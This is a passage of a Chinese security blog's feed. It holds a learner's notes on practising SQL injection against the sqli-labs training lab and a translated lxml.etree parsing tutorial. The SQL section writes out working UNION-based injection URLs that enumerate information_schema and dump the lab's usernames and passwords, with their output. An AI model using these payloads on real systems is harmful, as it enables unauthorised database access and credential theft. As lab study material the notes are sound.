alt="csv"></p><br><p><strong>注：</strong></p><p>1.<code>-T</code> 和 <code>-D</code> 选项后的值要用双引号的值括起来，单引号会报错。</p><br><p><strong>今天的实验就到这里了~</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前言：现在的网络安全措施日益健全，尤其是针对像 SQL 注入这样的常见漏洞也变得越来越不常见，或者难以利用，对新手体验/学习都不是很好；而且网络安全法也日益完善，所以目前来说，我认为使用 DVWA 或者 pikachu 这样的平台来熟悉 OWASP TOP 10 以及相关安全工具的应用，是必要且稳妥的。&lt;/p&gt;
&lt;p&gt;本文主要介绍一些 SQLMAP 的简单应用，由于暂时只是测试低级别的 SQL 注入，所以可以自己写一个有 SQL 注入的页面来进行测试，本文就是基于此的。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQL 注入之坑</title>
    <link href="https://pwn4justice.github.io/2019/06/10/SQL-%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%9D%91/"/>
    <id>https://pwn4justice.github.io/2019/06/10/SQL-注入之坑/</id>
    <published>2019-06-10T09:27:30.000Z</published>
    <updated>2019-07-06T08:03:46.582Z</updated>
    
    <content type="html"><![CDATA[<p>记录了一些自己在实践 SQL 注入时遇到的问题及解决和思考。</p><a id="more"></a><ol><li><p>对WHERE子句的一些浅要理解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">语句 `SELECT * FROM users WHERE username=&apos;admin&apos; OR 1=1;` </span><br><span class="line">相当于：`SELECT * FROM users WHERE username=&apos;admin&apos;;` </span><br><span class="line">和`SELECT * FROM users WHERE 1=1;` 结果的集合，</span><br><span class="line">既返回admin的数据又返回其他用户；</span><br><span class="line"></span><br><span class="line">同理：`SELECT * FROM users WHERE username=&apos;admin&apos; AND password=&apos;&apos; OR 1=1;`</span><br><span class="line">相当于 `SELECT * FROM users WHERE username=&apos;admin&apos; AND password=&apos;&apos;;` </span><br><span class="line">与 `SELECT * FROM users WHERE 1=1;` 的结果结合。</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p><code>--+</code> 注释在 MariaDB （5.5.56）命令行中出错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;SELECT version()===&gt; 5.5.56</span><br><span class="line">&gt;SELECT * FROM users WHERE username=&apos;admin&apos; OR 1=1 --+;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos; at line 1</span><br></pre></td></tr></table></figure></li><li><p>在注入遇到困难的时候要想到运用 <code>&amp;</code> 操作符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">考虑： SELECT * FROM users WHERE id=1 &amp; 1=1;# 优先级 ： &apos;&amp;&apos; &gt; &apos;=&apos;</span><br><span class="line">1. id=1 &amp; 1 # TRUE 与 1 进行与运算，结果为1</span><br><span class="line">2. 再 1=1， 结果还是1，既TRUE</span><br><span class="line">3. 返回表的所有行</span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>关于对3对应用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用数值转换后进行‘与’‘或’‘非’’异或‘等运算，然后再进行注入</span><br><span class="line">如，将字符转换为ASCII码，再分别与1，2，4，8... &amp;运算，可以</span><br><span class="line">得到每一位的值，拼接起来就是ASCII码，再从ASCII码反推回字符。</span><br></pre></td></tr></table></figure></li></ol><ol start="5"><li><p>不得不面对的系统数据库：information_schema</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;USE information_schema;</span><br><span class="line">&gt;SHOW tables;</span><br><span class="line">... 有 ...</span><br><span class="line">字符集表(CHARACTER_SETS)</span><br><span class="line">引擎表(ENGINES)</span><br><span class="line">事件表(EVENTS)</span><br><span class="line">文件(FILES)</span><br><span class="line">全局变量(GLOBAL_VARIABLES)</span><br><span class="line">模式权限表(SCHEMA_PRIVILEGES)# SCHEMA 我推测就是 所存在的所有数据库名</span><br><span class="line">TABLES  # 重要！存了所有数据库中的所有表的信息</span><br><span class="line">SCHEMATA# 当前存在的所有数据库名及其字符集，数据库名字段为 schema_name</span><br><span class="line">用户权限表(USER_PRIVILEGES)</span><br><span class="line">和一些InnoDB相关的表：以 INNODB_ 开头</span><br></pre></td></tr></table></figure></li></ol><ol start="6"><li><p>information_schema 的 TABLES 表中的’字段名’的解释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&gt; DESC TABLES;</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| Field           | Type                | Null | Key | Default | Extra |</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| TABLE_CATALOG   | varchar(512)        | NO   |     |         |       |</span><br><span class="line">| TABLE_SCHEMA    | varchar(64)         | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME      | varchar(64)         | NO   |     |         |       |</span><br><span class="line">| TABLE_TYPE      | varchar(64)         | NO   |     |         |       |</span><br><span class="line">| ENGINE          | varchar(64)         | YES  |     | NULL    |       |</span><br><span class="line">| VERSION         | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| ROW_FORMAT      | varchar(10)         | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_ROWS      | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| AVG_ROW_LENGTH  | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATA_LENGTH     | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| MAX_DATA_LENGTH | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| INDEX_LENGTH    | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATA_FREE       | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| AUTO_INCREMENT  | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CREATE_TIME     | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| UPDATE_TIME     | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| CHECK_TIME      | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_COLLATION | varchar(32)         | YES  |     | NULL    |       |</span><br><span class="line">| CHECKSUM        | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CREATE_OPTIONS  | varchar(255)        | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_COMMENT   | varchar(2048)       | NO   |     |         |       |</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">21 rows in set (0.00 sec)</span><br><span class="line">其中，</span><br><span class="line">TABLE_SCHEMA --- 当前已经存在的所有数据库名称</span><br><span class="line">TABLE_NAME.  --- 属于数据库&apos;TABLE_SCHEMA&apos;中的所有表的名称</span><br></pre></td></tr></table></figure></li></ol><ol start="7"><li><p>针对6的应用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;SELECT table_name</span><br><span class="line">FROM information.tables</span><br><span class="line">WHERE table_schema = &apos;test&apos;;#test数据库里存了用户名/账号表</span><br><span class="line">获得表名</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| users      |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ol><ol start="8"><li><p>利用 information_schema 的可用注入一般流程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. 可以查看有哪些数据库</span><br><span class="line">&gt; SELECT schema_name FROM information_schema.schemata;</span><br><span class="line"></span><br><span class="line">2. 还可以猜数据库存不存在</span><br><span class="line">&gt; SELECT * FROM information_schema.schemata WHERE schema_name = &apos;users&apos;;</span><br><span class="line">//users 数据库存不存在?</span><br><span class="line"></span><br><span class="line">3. 查看/猜某个已存在的数据库中有没有xxx表</span><br><span class="line">&gt; SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;db_name&apos;;</span><br><span class="line">or &gt; SELECT * FROM information_schema.tables WHERE table_name = &apos;xxx&apos;;</span><br><span class="line">or .. AND table_schema = &apos;yyy&apos;;</span><br><span class="line"></span><br><span class="line">4.获取某表的所有列</span><br><span class="line">&gt; SELECT column_name FROM information_schema.columns WHERE table_name = &apos;xxx&apos;;</span><br><span class="line"></span><br><span class="line">5.获取某列内容</span><br><span class="line">&gt; SELECT yyy FROM xxx [WHERE ...];</span><br></pre></td></tr></table></figure></li></ol><ol start="9"><li><p>有关 information_schema 数据库中 COLUMNS 表的相关信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [information_schema]&gt; DESC columns;</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| Field                    | Type                | Null | Key | Default | Extra |</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">//省略一些信息</span><br><span class="line">| TABLE_SCHEMA             | varchar(64)         | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME               | varchar(64)         | NO   |     |         |       |</span><br><span class="line">| COLUMN_NAME              | varchar(64)         | NO   |     |         |       |</span><br><span class="line">//</span><br><span class="line">| IS_NULLABLE              | varchar(3)          | NO   |     |         |       |</span><br><span class="line">| DATA_TYPE                | varchar(64)         | NO   |     |         |       |</span><br><span class="line">| CHARACTER_MAXIMUM_LENGTH | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">//</span><br><span class="line">| COLUMN_TYPE              | longtext            | NO   |     | NULL    |       |</span><br><span class="line">| COLUMN_KEY               | varchar(3)          | NO   |     |         |       |</span><br><span class="line">| EXTRA                    | varchar(27)         | NO   |     |         |       |</span><br><span class="line">| PRIVILEGES               | varchar(80)         | NO   |     |         |       |</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">20 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">大体结构为：</span><br><span class="line">+---+-------------------+---------------------+-------------------------+-------+</span><br><span class="line">xxx - 库名(TABLE_SCHEMA) - 该库的表名(TABLE_NAME) - 该表的列名(COLUMN_NAME) - xxx   |</span><br><span class="line">+---+-------------------+---------------------+-------------------------+-------+</span><br></pre></td></tr></table></figure></li></ol><ol start="10"><li><p>我对 ORDER BY 子句的误解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一直以为 ORDER BY + 列名;</span><br><span class="line">实际上，ORDER BY + 列名的序号也是可以的！如，</span><br><span class="line">ORDER BY 1# 表示按第一列排序</span><br><span class="line">ORDER BY 1 DESC # 按第一列降序排列</span><br><span class="line">ORDER BY 1,2 # 先按第一列后按第二列排序</span><br></pre></td></tr></table></figure></li><li><p>关于 group_concat(某列)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">分组连接，顾名思义</span><br><span class="line">将分组中的所有该列的内容，用&apos;,&apos;拼接在一起</span><br></pre></td></tr></table></figure></li><li><p>有关数据库权限的测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">MariaDB: </span><br><span class="line">&gt; grant all privileges on security.* to &apos;researcher&apos;@&apos;localhost&apos; identified by &apos;123456&apos; with grant option;</span><br><span class="line"></span><br><span class="line">修改 sql-connection/db_creds.inc:</span><br><span class="line">$dbuser=&apos;researcher&apos;</span><br><span class="line">$dbpass=&apos;123456&apos;</span><br><span class="line"></span><br><span class="line">执行</span><br><span class="line">http://10.211.55.13/sqli-labs/Less-1/?id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span><br><span class="line">看是否还能显示出所有的数据库信息</span><br><span class="line"></span><br><span class="line">测试结果</span><br><span class="line">只能显示少数已存在的数据库信息（这些信息都是&apos;researcher&apos;的权限可见的！</span><br><span class="line"></span><br><span class="line">显示的信息对比：</span><br><span class="line">当dbuser=root时，显示</span><br><span class="line">&gt;&gt;&gt; Your Login name:information_schema,Sample,challenges,cloud_data,dvwa,mysql,performance_schema,security,test###显示了所有数据库，是因为root权限太大，也就是控制该网页的管理员权限太大</span><br><span class="line">当dbuser=researcher时，显示</span><br><span class="line">&gt;&gt;&gt; Your Login name:information_schema,security,test</span><br><span class="line"></span><br><span class="line">结论：</span><br><span class="line">显示了所有数据库，是因为root权限太大，也就是控制该网页的管理员权限太大</span><br></pre></td></tr></table></figure></li></ol><ol start="13"><li><p>猜解security数据库中有哪些表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：</span><br><span class="line">http://10.211.55.13/sqli-labs/Less-1/?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos;--+</span><br><span class="line">输出：</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure></li></ol><ol start="14"><li><p>猜解表users中有哪些列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">INPUT：</span><br><span class="line">http://10.211.55.13/sqli-labs/Less-1/?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos; --+此时可以看到所有数据库中包含的users表中的字段信息</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">Your Login Name:      user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,user_id,username,password</span><br><span class="line">Your Password:3</span><br><span class="line"></span><br><span class="line">可以加强限制来避免这一点：</span><br><span class="line">http://10.211.55.13/sqli-labs/Less-1/?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = &apos;security&apos; and table_name=&apos;users&apos; --+</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">Your Login name:id,username,password</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure></li></ol><ol start="15"><li><p>得到合法字段名后，开始获取所需要的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">比如获取id=2的用户信息：</span><br><span class="line">INPUT:</span><br><span class="line">http://10.211.55.13/sqli-labs/Less-1/?id=-1%27%20union%20select%201,username,password%20from%20users%20where%20id=2%20--+</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">Your Login name:Angelina</span><br><span class="line">Your Password:I-kill-you</span><br></pre></td></tr></table></figure></li></ol><ol start="16"><li><p>来个所有数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">INPUT:</span><br><span class="line">http://10.211.55.13/sqli-labs/Less-1/?id=-1&apos; union select 1,group_concat(username),group_concat(password) from users --+</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br><span class="line">Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure><p>注：不只这么多花样，你还可以结合mysql的语法弄出更多花里胡哨的东西。。。</p><p>注2：之所以要使用group_concat是因为网站限制了输出的条目，LIMIT 0,1导致只能输出一条</p></li></ol><ol start="17"><li><p>总结</p><p>要想玩的熟练，必须得非常熟悉 information_schema 的数据库及其表的结构才行。</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录了一些自己在实践 SQL 注入时遇到的问题及解决和思考。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>lxml.etree tutorial - part five</title>
    <link href="https://pwn4justice.github.io/2019/06/08/lxml-etree-tutorial-part-five/"/>
    <id>https://pwn4justice.github.io/2019/06/08/lxml-etree-tutorial-part-five/</id>
    <published>2019-06-08T14:21:01.000Z</published>
    <updated>2019-07-30T06:11:04.544Z</updated>
    
    <content type="html"><![CDATA[<p>原文来源：<code>https://lxml.de/tutorial.html</code></p><p>本文内容：</p><ol><li>解析器对象</li><li>增量解析</li></ol><a id="more"></a><h3 id="解析器对象"><a href="#解析器对象" class="headerlink" title="解析器对象"></a>解析器对象</h3><p>默认来说，lxml.etree 使用了自带默认设置的标准解析器。如果你想配置这个解析器的话，可以先创建一个新的实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser = etree.XMLParser(remove_blank_text=<span class="literal">True</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(parser))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">lxml</span>.<span class="title">etree</span>.<span class="title">XMLParser</span>'&gt;</span></span><br></pre></td></tr></table></figure><p>上面语句创建了一个自定义的解析器，它会在解析的时候移除不同标签之间的空白文本，这会减小树的体积，并且避免出现空白的 TAIL 文本，我们知道这种位于一个标签尾部同时位于紧接着的另一标签头部的空白文本对我们的数据来说是毫无意义的。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.XML(<span class="string">"&lt;xml&gt;   &lt;a/&gt;   &lt;b&gt;   &lt;/b&gt;   &lt;c&gt;  test   &lt;/c&gt;   &lt;/xml&gt;"</span>, parser)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(root))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">lxml</span>.<span class="title">etree</span>.<span class="title">_Element</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">etree</span>.<span class="title">tostring</span><span class="params">(root)</span></span></span><br><span class="line"><span class="class"><span class="title">b</span>'&lt;<span class="title">xml</span>&gt;&lt;<span class="title">a</span>/&gt;&lt;<span class="title">b</span>&gt;   &lt;/<span class="title">b</span>&gt;&lt;<span class="title">c</span>&gt;  <span class="title">test</span>   &lt;/<span class="title">c</span>&gt;&lt;/<span class="title">xml</span>&gt;'</span></span><br></pre></td></tr></table></figure><p>注意：在 <code>&lt;b&gt;</code> 标签和 <code>&lt;c&gt;</code> 标签内部的空白字符没有移除，因为叶子元素里的内容通常被认为是<strong>数据</strong>（即使是空的）。不过你可以很容易的使用一些额外的步骤在遍历树的时候将其空白删除：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'&lt;xml&gt;&lt;a/&gt;&lt;b&gt;   &lt;/b&gt;&lt;c&gt;  test   &lt;/c&gt;&lt;/xml&gt;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> element <span class="keyword">in</span> root.iter(<span class="string">"*"</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> element.text <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> element.text.strip():</span><br><span class="line"><span class="meta">... </span>            element.text = <span class="literal">None</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root)</span><br><span class="line">b'&lt;xml&gt;&lt;a/&gt;&lt;b/&gt;&lt;c&gt;  test   &lt;/c&gt;&lt;/xml&gt;';; &lt;b&gt;   &lt;/b&gt; 变成了 &lt;b/&gt;</span><br></pre></td></tr></table></figure><p>参考 <em>help(etree.XMLParser)</em> 命令来了解更多的解析器选项。</p><br><h3 id="增量解析"><a href="#增量解析" class="headerlink" title="增量解析"></a>增量解析</h3><p><strong>不是像上面那样一次性完整解析，而是慢慢地，一步一步获取并解析一些片段数据，直至数据’传输’完整并解析完成</strong></p><p>lxml.etree 为增量逐步解析（incremental step-by-step parsing）提供了两种方式。一种是通过类文件对象（特点是有一个可以反复调用 的read()函数）。这种方式在待解析数据的来源是 <strong>urllib</strong> 或<strong>其他类文件对象</strong>（在一个网络请求中的数据）时特别有用。不过在这种情况下，解析器也会暂时被阻塞并且等待，直到数据顺利传输完成（数据是有效的）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">DataSource</span>:</span></span><br><span class="line"><span class="meta">... </span>    data = [ <span class="string">b"&lt;roo"</span>, <span class="string">b"t&gt;&lt;"</span>, <span class="string">b"a/"</span>, <span class="string">b"&gt;&lt;"</span>, <span class="string">b"/root&gt;"</span> ]</span><br><span class="line">...     def read(self, requested_size):;;??? requested_size 是什么? 哪来的???</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">try</span>:</span><br><span class="line"><span class="meta">... </span>            <span class="keyword">return</span> self.data.pop(<span class="number">0</span>)</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">except</span> IndexError:</span><br><span class="line"><span class="meta">... </span>            <span class="keyword">return</span> <span class="string">b''</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree = etree.parse(DataSource())</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(tree)</span><br><span class="line"><span class="string">b'&lt;root&gt;&lt;a/&gt;&lt;/root&gt;'</span></span><br></pre></td></tr></table></figure><p>第二种方式是通过一个 feed 解析器接口，由 feed(data) 和 close() 方法组成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser = etree.XMLParser()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser.feed(<span class="string">"&lt;roo"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser.feed(<span class="string">"t&gt;&lt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser.feed(<span class="string">"a/"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser.feed(<span class="string">"&gt;&lt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser.feed(<span class="string">"/root&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = parser.close()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root)</span><br><span class="line"><span class="string">b'&lt;root&gt;&lt;a/&gt;&lt;/root&gt;'</span></span><br></pre></td></tr></table></figure><p>这里，你可以随时打断解析过程并随后再次调用 feed() 方法来继续解析。这在你不想使用阻塞式的解析器时十分方便，例如在像 Twisted 这样的框架中，或者当数据传输的速率及大小都不稳定的情况下，也或者你想在等待下一块数据的时候能够干些别的事的时候。</p><p>在调用了 close() 方法（或者解析器抛出了一个异常）之后，你可以再次使用 feed() 来重用这个解析器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser.feed(<span class="string">"&lt;new_cycle/&gt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = parser.close()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root)</span><br><span class="line"><span class="string">b'&lt;new_cycle/&gt;'</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文来源：&lt;code&gt;https://lxml.de/tutorial.html&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;本文内容：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;解析器对象&lt;/li&gt;
&lt;li&gt;增量解析&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>lxml.etree tutorial - part four</title>
    <link href="https://pwn4justice.github.io/2019/06/07/lxml-etree-tutorial-part-four/"/>
    <id>https://pwn4justice.github.io/2019/06/07/lxml-etree-tutorial-part-four/</id>
    <published>2019-06-07T11:04:34.000Z</published>
    <updated>2019-07-30T06:10:57.077Z</updated>
    
